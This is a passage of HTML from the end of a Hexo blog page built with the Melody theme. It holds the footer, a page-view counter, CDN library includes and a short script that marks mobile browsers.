url(https://file.51ppt.vip/2020/2-8/192744-1521977264b903.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By YTsang</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.8.2"></script><script src="/js/fancybox.js?version=1.8.2"></script><script src="/js/sidebar.js?version=1.8.2"></script><script src="/js/copy.js?version=1.8.2"></script><script src="/js/fireworks.js?version=1.8.2"></script><script src="/js/transition.js?version=1.8.2"></script><script src="/js/scroll.js?version=1.8.2"></script><script src="/js/head.js?version=1.8.2"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
